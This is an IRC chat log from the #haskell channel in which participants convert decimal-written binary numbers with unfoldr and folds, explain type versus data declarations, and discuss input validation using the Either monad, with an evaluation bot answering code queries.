04:57:59 <ricky_clarkson> matthew-_: Come on, man, you can do better than that.
04:58:12 <ejt> I wondered if there was a ghc extension I was missing
04:58:14 <matthew-_> ricky_clarkson: true
04:58:14 * ejt tries
04:58:39 <idnar> hmm
04:58:53 <ejt> int-e: that works, thx
04:59:11 <ejt> or rather I get different errors ;)
04:59:14 <matthew-_> huh, I think an unfold would work well actually.
04:59:26 <ricky_clarkson> :t unfold
04:59:29 <rahaskella> Not in scope: `unfold'
04:59:42 <idnar> unfold + fold?
05:01:49 <wli> unfoldr
05:02:00 <fax> :t unfoldr
05:02:02 <rahaskella> forall b a. (b -> Maybe (a, b)) -> b -> [a]
05:03:17 <fax> @src unfoldr
05:03:17 <rahaskella> unfoldr f b  = case f b of
05:03:18 <rahaskella>    Just (a,new_b) -> a : unfoldr f new_b
05:03:18 <rahaskella>    Nothing        -> []
05:03:38 <matthew-_> foldr (\x acc -> acc * 10 + x) 0 . unfoldr (\x -> if x > 0 then Just ((x `mod` 2), (x `div` 2)) else Nothing) $ 29
05:03:42 <matthew-_> > foldr (\x acc -> acc * 10 + x) 0 . unfoldr (\x -> if x > 0 then Just ((x `mod` 2), (x `div` 2)) else Nothing) $ 29
05:03:44 <rahaskella>  11101
05:03:51 <fax> aha :D
05:04:08 <fax> > unfoldr (\x -> if x > 0 then Just ((x `mod` 2), (x `div` 2)) else Nothing) $ 29
05:04:10 <rahaskella>  [1,0,1,1,1]
05:04:30 <matthew-_> but it strikes me that this is going the wrong way round!
05:04:45 <matthew-_> > unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:04:46 <rahaskella>  [1,0,1,1,1]
05:04:58 * matthew-_ welcomes the head to the desk
05:05:01 <idnar> heh
05:05:10 <wli> Yeah, you need an unfoldl counterpart to unfoldr.
05:05:30 <matthew-_> yes, I see the problem now
05:05:33 <fax> > unfoldl (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:05:34 <rahaskella>   Not in scope: `unfoldl'
05:05:37 <idnar> representing a binary number as a decimal number composed of the same digits as the binary number is pretty evil
05:05:38 <fax> :.
05:05:55 <matthew-_> idnar: why thank you!
05:05:56 <Arnia> Can anyone here get to the darcs website?
05:06:37 <matthew-_> no, it seems to be being slow. http://monotone.ca/ works fine though. ;)
05:06:39 <rahaskella> Title: monotone: distributed version control
05:07:23 <ricky_clarkson> > let imap f n=if (n==0) then [] else (f $ n `mod 10):imap f (n `div` 10) in foldl (\x y -> x*2+y) 0 $ reverse $ imap id 11101
05:07:24 <rahaskella>  Parse error
05:07:57 <ricky_clarkson> > let imap f n=if (n==0) then [] else (f $ n `mod` 10):imap f (n `div` 10) in foldl (\x y -> x*2+y) 0 $ reverse $ imap id 11101
05:07:59 <rahaskella>  29
05:08:10 <Arnia> matthew_-: ah, alas I already use darcs. I just needed to look something up in the manual :)
05:08:24 * Arnia tries to figure out how to do RDF/XML generation again
05:09:43 <idnar> > foldr (\x y -> x `mod` 10 + y * 2) 11101
05:09:45 <rahaskella>  <[Integer] -> Integer>
05:09:52 <idnar> eep
05:10:13 <idnar> hmm, that made no sense anyway
05:10:22 * idnar gets more coffee
05:10:23 <matthew-_> I'm sure it'd be easier to just fix ghc so that you can use 0b notation
05:10:25 <ricky_clarkson> 11101 is not a list.
05:10:44 <ricky_clarkson> matthew-_: But better to fix ghc so that you can add 0b notation yourself.
05:11:10 <fax> > map (=='0') $ show 11101
05:11:12 <rahaskella>  [False,False,False,True,False]
05:11:14 <beelsebob_> ricky_clarkson: that would involve a whole langugae extension
05:11:20 * idnar ponders fold fusion
05:11:34 <beelsebob_> remember -- Haskell is not meant to be the be all and end all of languages -- it's meant to be small and neat
05:11:34 * matthew-_ likes the direction fax is heading in
05:12:06 <matthew-_> fax: actually, I was banned from going via char
05:12:11 <ricky_clarkson> :)
05:12:31 <matthew-_> apparently "I can do better".
05:12:35 <Botje> @quote endo
05:12:35 <rahaskella> xerox says: <dons> then again, bots themselves are simple  <xerox> "...they are just a morphism in the category of IRC channels together with an endomapping ..."
05:12:37 <Botje> @quote endo
05:12:37 <rahaskella> psykotic says: [monads aren't hard] they're just monoids on the category of endofunctors over some category, what's the big deal?
05:12:40 <Botje> grrr :P
05:12:43 <Botje> @quote hylo
05:12:43 <rahaskella> stepcut says: endo-hylo-cata-ana-expi-ali-docious
05:13:22 <fax> @pointless if x then 1 else 0
05:13:22 <rahaskella> if' x 1 0
05:13:26 <Philippa> beelsebob_: that's questionable for a language with a layout rule, a pile of sugar and two ways to go about defining functions and binding things
05:13:45 <fax> > foldr (\x y-> 2*y + if' x 1 0) 0 $ map (=='1') $ show 11101
05:13:47 <rahaskella>   Not in scope: `if''
05:13:49 <fax> :/
05:13:54 <Botje> @djinn Int -> Int -> [Int]
05:13:55 <rahaskella> -- f cannot be realized.
05:13:57 <Botje> boo
05:14:07 <fax> @pointless (\x y-> 2*y + if x then 1 else 0)
05:14:08 <rahaskella> (. (2 *)) . (+) . flip (flip if' 1) 0
05:14:14 <scook0> (re. binary literals) you could always make a Template Haskell function that takes a decimal string, checks that it contains only 1s and 0s, and converts it to binary ;)
05:14:35 <fax> > let ob = foldr (. (2 *)) . (+) . flip (flip if' 1) 0 0 $ map (=='1') $ show) in ob 11101
05:14:36 <rahaskella>  Unbalanced parenthesis
05:14:37 <EvilTerran> i already suggested that earlier
05:14:55 <matthew-_> no Chars!
05:14:55 <taruti> will that work in patterns?
05:15:15 <scook0> ah, I wasn't paying that much attention
05:15:45 <ricky_clarkson> scook0: You don't actually need to check.
05:15:48 <EvilTerran> taruti, you'd have to have seperate TH functions to prudude a LitE or a LitP
05:16:05 <ricky_clarkson> I remember a version of BASIC where the frombinary function would let you put 2 in.
05:16:22 <scook0> ricky_clarkson: only in the sense that your program's semantics don't *need* to be well-defined
05:16:41 <scook0> "There's no such thing as 2!"
05:16:48 <ricky_clarkson> They are well-defined, but the codomain isn't properly restricted.
05:16:55 <ricky_clarkson> s/properly/formally/
05:16:57 <EvilTerran> unless you made Num instances for both LitE and LitP; then $(12) would be the same as just 12, so your normal function could also be used as a TH function
05:17:10 <EvilTerran> even in patterns
05:17:16 <beelsebob_> Philippa: what's a camel?
05:17:17 <EvilTerran> actually, that'd be kinda cool
05:17:22 <fax> > map (`mod` 10) $ iterate (`div` 10) 110111
05:17:24 <rahaskella>  [1,1,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0...
05:17:31 <fax> :|
05:18:00 <matthew-_> > unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:18:01 <scook0> take . length . show
05:18:02 <rahaskella>  [1,0,1,1,1]
05:18:08 <matthew-_> > reverse . unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:18:08 <EvilTerran> > let f 0 = Nothing; f x = Just (x `divMod` 10) in unfoldr f 110111
05:18:10 <rahaskella>  [1,1,1,0,1]
05:18:11 <rahaskella>  [11011,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0...
05:18:29 <EvilTerran> er. whose is which, there?
05:18:32 <matthew-_> ok, so mine gets you to the list. so then the plus stuff
05:18:35 <matthew-_> > reverse . unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:18:36 <rahaskella>  [1,1,1,0,1]
05:18:38 <EvilTerran> okay
05:19:00 <matthew-_> > foldl (\x y -> x*2 + y) . reverse . unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:19:02 <rahaskella>   add an instance declaration for (Num [a])
05:19:02 <rahaskella>     In the expression: (x * 2) + ...
05:19:08 <matthew-_> > foldl (\x y -> x*2 + y) 0 . reverse . unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:19:09 <rahaskella>  29
05:19:13 <EvilTerran> > let f 0 = Nothing; f x = Just $ swap (x `divMod` 10) in unfoldr f 110111
05:19:13 <matthew-_> woot! No Chars!
05:19:14 <rahaskella>   Not in scope: `swap'
05:19:22 <EvilTerran> @let swap (x,y) = (y,x)
05:19:25 <rahaskella> Plugin `eval' failed with: IRCRaised Data.ByteString.last: empty ByteString
05:19:28 * matthew-_ wins again
05:19:34 <matthew-_> ricky_clarkson: is that better?
05:19:44 <EvilTerran> > let f 0 = Nothing; f x = Just $ uncurry (flip (,)) (x `divMod` 10) in unfoldr f 110111
05:19:46 <rahaskella>  [1,1,1,0,1,1]
05:19:56 <matthew-_> > foldr (\x y -> x*2 + y) 0 . unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:19:57 <rahaskella>  8
05:19:58 <idnar> where does if' come from?
05:20:02 <scook0> > (\x -> reverse $ take (length . reverse . show $ x) $ map (`mod` 10) $ iterate (`div` 10) $ x) 110111
05:20:03 <rahaskella>  [1,1,0,1,1,1]
05:20:09 <EvilTerran> @source if'
05:20:10 <rahaskella> if' not available
05:20:17 <matthew-_> > foldl (\x y -> x*2 + y) 0 . reverse . unfoldr (\x -> if x > 0 then Just ((x `mod` 10), (x `div` 10)) else Nothing) $ 11101
05:20:18 <EvilTerran> i think it's an invention of the bot
05:20:18 <rahaskella>  29
05:20:43 <ricky_clarkson> matthew-_: It must be better, because I don't understand it. ;)
05:21:09 <fax> if' x y z = if x then y else z
05:21:11 <matthew-_> ricky_clarkson: well, the unfold takes the number and produces a list. the foldl takes the list and makes a number
05:21:20 <EvilTerran> > let bin 0 = 0; bin x = x `mod` 10 + 2 * bin (x `div` 10) in bin 11101
05:21:22 <rahaskella>  29
05:21:26 <EvilTerran> easier ^^
05:21:51 <matthew-_> EvilTerran: no higher order functions! What the hell are you playing at? ;-P
05:22:01 <fax> @pointless x `mod` 10 + 2 * bin (x `div` 10)
05:22:02 <rahaskella> x `mod` 10 + 2 * bin (x `div` 10)
05:22:06 <EvilTerran> i very rarely find unfoldr actually saves me anything
05:22:24 <EvilTerran> if we had lambda-match, it would, but it doesn't without it
05:22:58 <scook0> @pl \x -> x `mod` 10 + 2 * bin (x `div` 10)
05:22:59 <rahaskella> liftM2 (+) (`mod` 10) ((2 *) . bin . (`div` 10))
05:23:25 <EvilTerran> scook0, wow, that's almost clear. impressive for @pl output. ;]
05:23:30 <matthew-_> err, but I wanted the answer in hex
05:23:36 <scook0> good old (->) monad
05:23:39 <idnar> heh
05:24:00 <idnar> that one always confuses me
05:24:15 <idnar> @pl decode base number = foldr (\x y -> x + base * y) 0 (map digitToInt number)
05:24:15 <rahaskella> decode = (. map digitToInt) . flip foldr 0 . flip ((.) . (+)) . (*)
05:24:39 <EvilTerran> > let bin 0 = 0; bin x = uncurry (+) . first (2*) . divMod $ x in bin 11101
05:24:39 <rahaskella>  Couldn't match expected type `(t, d)'
05:24:50 <EvilTerran> er
05:24:57 <EvilTerran> ?type uncurry (+) . first (2*) . divMod
05:25:00 <rahaskella>     Couldn't match expected type `(t, d)'
05:25:00 <rahaskella>            against inferred type `a -> (a, a)'
05:25:08 <idnar> @pl decode base number = foldr (\x y -> (digitToInt x) + base * y) 0 number
05:25:09 <rahaskella> decode = flip foldr 0 . flip ((.) . (+) . digitToInt) . (*)
05:25:13 <scook0> :t liftM2
05:25:15 <rahaskella> forall a1 a2 r (m :: * -> *). (Monad m) => (a1 -> a2 -> r) -> m a1 -> m a2 -> m r
05:25:17 <EvilTerran> > let bin 0 = 0; bin x = uncurry (+) . first (2*) . (`divMod` 10) $ x in bin 11101
05:25:19 <rahaskella>  2221
05:25:27 <EvilTerran> um
05:25:40 <EvilTerran> > let bin 0 = 0; bin x = uncurry (+) . first ((2*).bin) . (`divMod` 10) $ x in bin 11101
05:25:41 <rahaskella>  29
05:25:43 <EvilTerran> there we go!
05:26:16 <EvilTerran> matthew, enough HOFs for you now?
05:26:43 <matthew-_> no, I want the answer in Hex
05:26:49 <scook0> hmm, I should get in the habit of using first/second
05:26:57 <EvilTerran> that's got nothing to do with the HOFs, tho ;]
05:26:58 <scook0> I tend to use (id *** f) a fair bit
05:27:06 <matthew-_> > let bin 0 = 0; bin x = uncurry (+) . first ((2*).bin) . (`divMod` 10) $ x in flip showHex "" . bin 11101
05:27:07 <EvilTerran> @src (***)
05:27:07 <rahaskella>   add an instance declaration for (Integral (a -> b))
05:27:07 <rahaskella> f *** g = first f >>> second g
05:27:16 <matthew-_> > let bin 0 = 0; bin x = uncurry (+) . first ((2*).bin) . (`divMod` 10) $ x in flip showHex "" $ bin 11101
05:27:17 <rahaskella>  "1d"
05:27:20 <matthew-_> yay!
05:27:23 <EvilTerran> ?type intToDigit
05:27:23 <matthew-_> finally
05:27:26 <rahaskella> Int -> Char
05:27:32 <EvilTerran> > intToDigit 10
05:27:34 <rahaskella>  'a'
05:28:13 <matthew-_> oops.
05:28:25 <matthew-_> > intToDigit 17
05:28:27 <rahaskella>  Exception: Char.intToDigit: not a digit 17
05:28:30 <matthew-_> > intToDigit 15
05:28:31 <rahaskella>  'f'
05:28:56 <EvilTerran> > let hexBin 0 = ""; hexBin x = uncurry (++) . (hexBin *** intToDigit) . (`divMod` 10) $ x in hexBin 11101
05:28:57 <rahaskella>  Couldn't match expected type `[Char]' against inferred type `Char'
05:29:04 <EvilTerran> > let hexBin 0 = ""; hexBin x = uncurry (++) . (hexBin *** return . intToDigit) . (`divMod` 10) $ x in hexBin 11101
05:29:06 <rahaskella>  "11101"
05:29:11 <matthew-_> yay!
05:29:13 <EvilTerran> ...
05:29:19 <EvilTerran> doh
05:29:26 <matthew-_> it's "show" jim, but not as we know it ...
05:29:46 <ricky_clarkson> beelsebob_: Yes, it would require a language extension.  You say that like it's a bad thing.
05:29:52 <EvilTerran> ?type showBase
05:29:55 <rahaskella> Not in scope: `showBase'
05:29:59 <Dema_> Does rahaskella answer questions in private chat?
05:30:15 <matthew-_> Dema_: apparently not if you're registered and filter messages
05:30:30 <EvilTerran> filter messages?
05:30:46 <matthew-_> /msg NickServ set unfiltered on
05:31:01 <beelsebob_> ricky_clarkson: yes -- people spend quite a lot of time complaining that there are no tools for Haskell -- in reality there are *lots* of tools for Haskell, just no one uses Haskell -- they all use Haskell + random obscure extension
05:31:12 <Dema_> A... I see...
05:32:01 <matthew-_> Dema_: you might also want to turn off flood protection for rahaskella depending on your irc client
05:32:04 <Dema_> matthew-_:  But what if I'm not registered?
05:32:26 <EvilTerran> > ($ "") . showIntAtBase 16 intToDigit . fst . head . readInt 2 (`elem` "01") digitToInt . show $ 11101
05:32:28 <rahaskella>  "1d"
05:32:50 <int-e> she's registered now :)
05:33:07 <matthew-_> Dema_: ahh, um, I'm not sure
05:33:17 <matthew-_> int-e: does rahaskella turn filtered off?
05:33:47 <EvilTerran> ah, so it works now without me changing my filteredness. great.
05:33:49 <Dema_> matthew-_: Ok, thanks. I'll try to register myself:)
05:34:15 <int-e> now whose bot was that again?
05:34:42 <xerox> ari's
05:35:49 <gpi5> Why is 'data T2 = [T1]' invalid? (I want to say that T2 is an array of T1.
05:35:52 <int-e> thanks
05:36:12 <EvilTerran> gpi5, data's need to have a constructor
05:36:18 <EvilTerran> data T2 = T2 [T1] would work
05:36:24 <EvilTerran> as would type T2 = [T1
05:36:25 <EvilTerran> ]
05:36:45 <gpi5> Thanks!
05:37:03 <EvilTerran> "type" just introduces an alias, "data" actually introduces something the typechecker cares about
05:37:41 <EvilTerran> so there's gotta be some way of indicating whether you mean [t1] :: T2 or [t1] :: [T1]; hence, constructor!
05:37:58 <gpi5> But the type checking actually made will be same if I use either type or data, right?
05:38:06 <EvilTerran> (if you're using a data, that is. if you're using a type, it's expanded away before the typechecker even looks at it)
05:38:36 <EvilTerran> i suspect, for this case, the type is what you want
05:38:41 <gpi5> I don't really get the difference
05:38:53 <gpi5> But thanks, I'll give it a try
05:39:53 <EvilTerran> "data" is used to define a set of constructors for a new type; data Foo a = Bar a | Baz [a] | Eek, for instance, introduces the 3 constructors Bar :: a -> Foo a, Baz :: [a] -> Foo a, and Eek :: Foo a
05:40:25 <scook0> it's a bit like the difference between "typedef" and "struct" in C, if that's any help
05:40:29 <EvilTerran> "type" just introduces a new name for an existing type, so after "type Foo = Bar", "... :: Foo" and "... :: Bar" are exactly equivalent
05:40:38 <therp> gpi5: type T1 = T2 is rather like an alias, in the sense of "#define T1 T2", while data actually introduces a new type in the type system.
05:41:00 <scook0> typical #haskell ;)
05:41:06 * EvilTerran agrees with both of those interpretations
05:41:09 * EvilTerran stops waffling now
05:42:12 <gpi5> Ok.. But assume data T1 = ZERO | ONE | X
05:42:13 <araujo> morning
05:42:25 <EvilTerran> yeah
05:43:16 <gpi5> Is there a way to declare T2 as a list of T1 which would allow me to write [ZERO, ONE]
05:43:31 <EvilTerran> that'd be type T2 = [T1]
05:43:33 <scook0> gpi5: in that case you'd want type
05:43:34 <sieni> yes, type T2 = [T1]
05:43:56 <gpi5> ... the type of [ZERO, ONE] being T2 ?
05:44:09 <EvilTerran> yes, or [T1]. they'd be the same thing.
05:44:37 <gpi5> Ok, then that's what I want. Thanks
05:44:38 <scook0> so any function expecting [T1] will take a T2, and vice-versa
05:44:58 <sieni> gpi5: a data definition without constructors is useless, since you woulnd't be able to produce any values of that type
05:45:08 <scook0> sieni: Phantom types!
05:45:31 <EvilTerran> "type"s're fine for that sort of thing; "data"s are more for if you want to explicitly label anything ::T2 as different from anything ::[T1]
05:45:53 <scook0> (constructorless datas) it's also the type-level equivalent of sticking "= undefined" in bits of code you haven't written yet
05:45:57 <EvilTerran> or if you want multiple constructors, or multiple-parameter constructors
05:46:15 <gpi5> sieni: would you say that my definition of T1 is useless then?
05:46:18 <EvilTerran> "newtype"s are somewhere in the middle
05:46:33 <EvilTerran> gpi5, no, you've got constructors there
05:46:40 <EvilTerran> they just don't have any parameters
05:46:45 <EvilTerran> still constructors
05:47:37 <scook0> data T1 = ZERO | ONE | X -- three nullary constructors
05:47:50 <scook0> data T1 -- no constructors, requires a language extension ;)
05:48:18 <gpi5> EvilTerran : ok, I indeed thought ZERO was a ctor.. Ctor are just a way to make the type explicit for GHC right?
05:48:44 <EvilTerran> um
05:49:02 <gpi5> (As far as I see, it helps the type checker making sure what a type is?)
05:49:26 <EvilTerran> kinda, yes
05:49:27 <scook0> what you've written is equivalent to "enum T1 { ZERO; ONE; X; }"
05:49:32 <sieni> gpi5: you have constructors ZERO, ONE and X. What I mean is that if you were allowed to say something like data Foo = [Bar], then Foo would presumably be of different type than [Bar] so you would not be able to assign any values to a variable of type Foo, since stuff like let foo = (bar :: [Bar]) :: Foo would not typecheck
05:50:31 <EvilTerran> gpi5, yes, constructors are used so the system knows what types you're dealing with. they do more than that, but they do do that.
05:50:34 <scook0> consider data Bool = True | False
05:52:03 <vincenz> Anyone know a paper I could refer to for the original definition of _Maybe_ ?
05:53:08 <ddarius> The Haskell 1.0 Report?
05:53:30 <mrd> ddarius: no, Maybe (The Haskell 1.0 Report)
05:53:43 <mrd> or rather, Just
05:53:43 <EvilTerran> Nothing!
05:53:54 * mrd still confuses Maybe and Just sometimes
05:54:12 <vincenz> Anyone happen to have a bibtex for it?
05:55:15 <Saul__> I want to check some constraints on user input
05:55:46 <Saul__> but I'm not sure how to properly link the constraints to the error messages that the user should see
05:56:49 <scook0> Saul__: perhaps Either, or a Writer monad for error messages?
05:57:06 <Saul__> I think it whould be nice to do the checks themselves with functions of type a -> Bool, since then you can easily make checks like (==3) or (==3).length
05:57:15 <vincenz> What about a smaller document describing Maybe?  The haskell report is rather complicated :|
05:57:45 <scook0> vincenz: you don't have a dead-tree "learn Haskell" book?
05:58:03 <EvilTerran> Saul__, i'd suggest the Either monad, too
05:58:21 <ddarius> Hmm, looking at it I'm not sure if it actually defines Maybe
05:58:50 <Saul__> I don't think I need the Either, since I either have or not have an error
05:58:59 <vincenz> scook0: I need a reference for a paper
05:59:06 <EvilTerran> Saul__, you could write your input-processing functions to be String -> m a, and then return successful values or fail with descriptive error messages
05:59:14 <vincenz> I use Maybe outside of a haskell context, so for readers not familiar with the concept, I want to provide a reference with a good explanation
05:59:43 <EvilTerran> then you could choose between using Maybe or Either when you're actually using the thing. or any other monad.
05:59:46 <scook0> vincenz: oh, you want a *useful* reference (instead of just a mandatory one)
05:59:47 <ddarius> I doubt there is a document dedicated to Maybe.
06:00:01 <vincenz> scook0: preferably
06:00:29 <Saul__> vincenz: Can't you just explain it yourself and then refer to the report?
06:00:46 <EvilTerran> Saul__, the idea would be that your input-processing functions would be :: String -> Either String a, and failure would be indicated by returning Left "description of what the user did wrong"
06:01:26 <vincenz> wow
06:01:27 <Saul__> ah and the right would just be put into the next processing function?
06:01:29 <vincenz> there's no Maybe in 1.0!
06:01:42 <ddarius> vincenz: Indeed.
06:01:46 <vincenz> ddarius: no Maybe in 1.0
06:01:50 <vincenz> oh you have backlogging?
06:02:03 <scook0> you could create a combinator like check :: (a -> Bool) -> String -> a -> Either String ()
06:02:10 <EvilTerran> Saul__, indeed. and using Either monadically would be fairly painless
06:02:18 <ddarius> I heard it before it dropped.  Also, I said that I thought that that was the case upon looking at the Report.
06:02:38 <ddarius> Now I'm curious which version it got introduced in.  Probably 1.1
06:02:49 <Saul__> EvilTerran: That might actually be pretty nice
06:03:05 <EvilTerran> @src Either (>>=)
06:03:05 <rahaskella> Left  l >>= _ = Left l
06:03:05 <rahaskella> Right r >>= k = k r
06:03:09 <EvilTerran> @src Either return
06:03:09 <rahaskella> return        = Right
06:03:12 <EvilTerran> @src Either fail
06:03:12 <rahaskella> fail msg      = Left (strMsg msg)
06:03:23 <Saul__> Next problem though (sort of)
06:03:50 <vincenz> I do explain it a bit, anyways, even if I just use h98 report, there's no bibtex afaics
06:03:57 <EvilTerran> hm.
06:03:58 <EvilTerran> ?type strMsg
06:04:00 <rahaskella> forall a. (Error a) => String -> a
06:04:08 <EvilTerran> ?instances Error
06:04:09 <matthew-_> err, I thought Either was only a member of Monad if it was Either Error
06:04:09 <rahaskella> IOError, [Char]
06:04:10 <Saul__> I don't want my error messages to be of type string, but of some type that holds the necessary data to build a string
06:04:31 <EvilTerran> ?instances Monad
06:04:32 <rahaskella> ((->) r), ArrowMonad a, Cont r, ContT r m, Either e, ErrorT e m, IO, Maybe, RWS r w s, RWST r w s m, Reader r, ReaderT r m, ST s, State s, StateT s m, Writer w, WriterT w m, []
06:04:36 <scook0> Saul__: easy, just use Either MyErrorType
06:04:43 <scook0> instead of Either String
06:04:45 <matthew-_> ahh, I see. Thans EvilTerran
06:04:47 <EvilTerran> what scook0 said
06:05:10 <scook0> where does that Either instance live?
06:05:32 <matthew-_> but frankly, if you're going to convert to String then you may aswell just use String as laziness will ensure you don't do unnecessary work
06:05:40 <Saul__> I will, but I'm not sure how to properly model those error types
06:05:52 <ddarius> Haskell 1.3 seems to be the first.
06:06:08 <vincenz> meh, afaict not even "A gentle intro ..." introduces _Maybe
06:06:18 <vincenz> at least I had a bibtex for that one
06:06:22 <EvilTerran> scook0, er... i don't know...
06:06:24 <Saul__> I can of course make a single data type with a bucketload of constructors, but then you would also get a huge show function instead of several succinct ones
06:06:41 <scook0> I can't find it in Hoogle or Hierarchical
06:06:43 <EvilTerran> it's not in the Prelude, AFAICT, nor in Control.Monad or Data.Either
06:06:49 <scook0> though it would be easy to define yourself
06:07:00 <EvilTerran> ?index Either return
06:07:00 <rahaskella> bzzt
06:07:01 <Saul__> I also want to make it so that it easily extends to internationalization
06:07:18 <ddarius> Control.Monad.Error or Control.Monad.Instances
06:08:04 <EvilTerran> it's not in Instances...
06:08:06 <vincenz> \o/
06:08:14 <vincenz> http://dblp.uni-trier.de/rec/bibtex/journals/jfp/Jones03q
06:08:14 <rahaskella> Title: DBLP Record 'journals/jfp/Jones03q'
06:08:26 <vincenz> sadly, I can't check whether it's a good article, since you gotta pay for it o.O
06:08:38 <Saul__> and also the combinator that scook0 suggested (check :: (a -> Bool) -> String -> a -> Either String ()) won't work when each error type has different arguments in it's constructor
06:08:45 <quicksilver> the monad instance for Either isn't haskell98
06:08:49 <gpi5> Given a complex type made of several subtypes, what is the best way to parse a string (and construct an instance of this type)? Any example for that?
06:08:52 <quicksilver> that's why it's tucked away in Control.Monad.error
06:09:17 <quicksilver> gpi5: using a parser combinator system, probably. Like parsec or ReadP
06:10:22 <EvilTerran> ah, yes, it is in there. although not mentioned in the haddock for it for some reason =/
06:10:26 <scook0> Saul__: it might be worth having an error type (L10nContext -> String), or maybe even a L10n monad :)
06:11:03 <scook0> and the signature for the check combinator assumes you don't actually need the checked term to produce the error message
06:11:37 <scook0> otherwise you might as well write (a -> Either MyError ()) directly
06:11:48 <gpi5> quicksilver : thanks, and would I have pretty-printing for free?
06:12:02 <quicksilver> gpi5: no
06:12:14 <quicksilver> gpi5: that's a neat trick but not that easy to pull off
06:12:21 <Saul__> scook0: I think I might need to, but then you can't use things like (>3), which are nice
06:12:28 <scook0> you can get *printing* just by deriving Show, but it isn't *pretty*
06:12:31 <EvilTerran> man, graphical web browsers are sluggish over an X tunnel
06:13:22 <vincenz> scook0: PPrint
06:13:39 <scook0> Saul__: a good compromise in some cases might be check' :: (a -> Bool) -> (a -> Error) -> Either Error ()
06:13:51 <scook0> if you want to know *what* failed, but don't care exactly *why*
06:14:04 <ddarius> You can define parsing as the inverse of pretty printing
06:14:33 <Saul__> scook0: Well I actually think it's more helpful to say why something failed than what
06:14:42 <EvilTerran> hey vincenz, it seems one can get that article for free from a university IP address
06:14:58 <scook0> i.e. check' (>=3) (printf "The number %n was less than 3")
06:15:14 <EvilTerran> (i'm guessing said university would have to've bought some subscription)
06:15:17 <scook0> Saul__: you still get "what" at the granularity of your checking function
06:15:32 <scook0> and if you want better than that, you'll have to write it all by hand anyway
06:15:46 <Saul__> scook0: I guess I will :(
06:16:04 <vincenz> EvilTerran: yeah, well, the greek university net is down!
06:16:06 <vincenz> since like a day
06:16:08 <scook0> since no combinator can tell you why (a -> Bool) failed
06:16:16 * vincenz curses at the bad support level agreements
06:16:53 <Saul__> scook0: Thanks, at least the Either monad will make it better
06:17:14 <Saul__> EvilTerran: Thank you as well
06:17:28 <scook0> I imagine check and check' would be good enough for many cases, if your checks are fine-grained enough
06:17:29 <EvilTerran> =]
06:19:24 <Saul__> scook0: I'll play around with those two functions a little and see if I can make them work
06:20:34 <scook0> @djinn (a -> Bool) -> (a -> String) -> a -> Either String ()
06:20:34 <rahaskella> f a b c =
06:20:34 <rahaskella>     case a c of
06:20:34 <rahaskella>     False -> Left (b c)
06:20:34 <rahaskella>     True -> Right ()
06:20:48 <scook0> @djinn (a -> Bool) -> String -> a -> Either String ()
06:20:49 <rahaskella> f a b c =
06:20:49 <rahaskella>     case a c of
06:20:49 <rahaskella>     False -> Left b
06:20:49 <rahaskella>     True -> Right ()
06:21:00 <scook0> Saul__: don't even need to write them yourself!
06:21:09 <idnar> heh
06:21:21 <Saul__> :)
06:22:06 <scook0> actually, I was a little surprised to see djinn do such a good job
06:22:22 <gkr> @djinn Either a b -> Either a b -> Either a b
06:22:23 <rahaskella> f a b =
06:22:23 <rahaskella>     case a of
06:22:23 <rahaskella>     Left c -> case b of
06:22:23 <rahaskella>               Left d -> Left d
06:22:23 <rahaskella>               Right _ -> Left c
06:22:24 <rahaskella>     Right e -> Right e
06:22:42 <gkr> At first sight, I thought it would do f a _ = a
06:23:14 <vincenz> where is lambdabot?
06:23:15 <vincenz> @bot
06:23:16 <rahaskella> :)
06:23:38 <olsner> but that would be Either a b -> c -> Either a b
06:24:32 <Saizan> gkr: it has been adjusted to give more interesting proofs
06:25:05 <LeCamarade> ?seen lambdabot
06:25:05 <rahaskella> I saw lambdabot leaving #haskell 15h 30m 42s ago, and .
06:26:47 <Saul__> @djinn (a -> Bool) -> a -> Maybe a
06:26:48 <rahaskella> f a b =
06:26:48 <rahaskella>     case a b of
06:26:48 <rahaskella>     False -> Nothing
06:26:48 <rahaskella>     True -> Just b
06:29:11 <vincenz> How can that be..
06:29:18 <vincenz> tha tmeans rahaskella was in here while lambdabot was in here
06:30:49 <scook0> I smell an evil plot! ;)
06:31:32 * EvilTerran wanders off
06:31:40 <EvilTerran> laters y'all! ;]
06:55:48 <Saizan> anyone tried to solve the exercises at the end of http://sigfpe.blogspot.com/2007/09/type-of-distinct-pairs.html ?
06:55:49 <rahaskella> Title: A Neighborhood of Infinity: The Antidiagonal
07:15:45 <shapr> @yow !
07:15:46 <rahaskella> Couldn't find fortune file
07:15:49 <shapr> aww
07:19:15 <pgavin> @seen dcoutts
07:19:15 <rahaskella> dcoutts is in #haskell. I don't know when dcoutts last spoke.
07:26:42 <int-e> Saizan: I have some types for that.
07:27:55 <dcoutts> pgavin: sorry, a tad busy as I'm moving house :-)  (AAAARGH) ;-)
07:27:57 <smoofra> is it possible to create your own "derivable" typeclasses?
07:28:00 <Saizan> int-e: i'm stuck on how to interpret the algebraic form of the antidiagonal for T = 2 + T^2
07:28:37 <int-e> Saizan: a corresponding haskell type is given in the next line
07:28:48 <Saizan> ok
07:29:36 <Saizan> int-e: yeah, i know how 2+T^2 work, and i've calculated the antidiagonal, but i've some terms that i don't know how to handle
07:30:11 <vincenz> T = 2 + T^2 ==== data Foo = Left | Right | Tree Foo Foo
07:30:38 <mauke> smoofra: no
07:30:40 <Saizan> smoofra: not inside the language, you either use a preprocessor or template haskell to make automatic instances
07:31:09 <int-e> Saizan: I didn't even try to do it algebraically
07:31:24 * Arnia looks at his freezer with awe
07:31:27 <Arnia> It has frozen solid
07:32:04 <Saizan> int-e: ah, what did you come up with?
07:32:35 <Saizan> *came
